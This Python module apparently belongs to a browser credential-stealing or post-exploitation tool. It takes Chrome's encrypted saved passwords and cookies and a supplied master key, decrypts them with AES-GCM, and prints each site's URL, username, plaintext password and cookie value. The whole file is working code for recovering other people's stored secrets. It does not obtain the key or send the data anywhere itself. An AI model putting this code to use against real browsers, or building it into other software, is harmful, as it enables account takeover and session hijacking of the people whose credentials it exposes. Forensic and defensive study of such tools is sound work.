from Cryptodome.Cipher import AES
from colored import fg

block = fg('light_sky_blue_3a')
title = fg('blue')
main_title = fg('red')
data = fg('dark_green_sea')


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(chrome_master_key, iv):
    return AES.new(chrome_master_key, AES.MODE_GCM, iv)


def decrypt_cipher(encrypted_password, chrome_master_key):
    try:
        encrypted_password = bytes.fromhex(encrypted_password)
        chrome_master_key = bytes.fromhex(chrome_master_key)
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = generate_cipher(chrome_master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except:
        return "Unknown"


def handle_chrome_passwords(creds_arr: [], chrome_master_key: str) -> None:
    print(main_title + "Chrome Credentials:")
    for num in creds_arr:
        creds_json = creds_arr.get(num)
        enc_password = creds_json[2].get('password')
        plaint_text_pass = decrypt_cipher(enc_password, chrome_master_key)
        plaint_text_pass and output_chrome_credentials(
            [creds_json[0].get('url'), creds_json[1].get('username'), plaint_text_pass])


def handle_chrome_cookies(cookies_arr: [], chrome_master_key: str) -> None:
    print(main_title + "Chrome Cookies:")
    for cookie_obj in cookies_arr:
        cookie_domain = cookie_obj.get("Domain")
        enc_cookie = cookie_obj.get("Value")
        plaint_text_cookie = decrypt_cipher(enc_cookie, chrome_master_key=chrome_master_key)
        output_chrome_cookies([cookie_domain, plaint_text_cookie])


def output_chrome_credentials(print_object: []):
    print(block + '[--]')
    print(title + '|Url|' + data + print_object[0])
    print(title + '|Username|' + data + print_object[1])
    print(title + '|Password|' + data + print_object[2])


def output_chrome_cookies(print_object: []):
    print(block + '[--]')
    print(title + '|Url|' + data + print_object[0])
    print(title + '|Value|' + data + print_object[1])
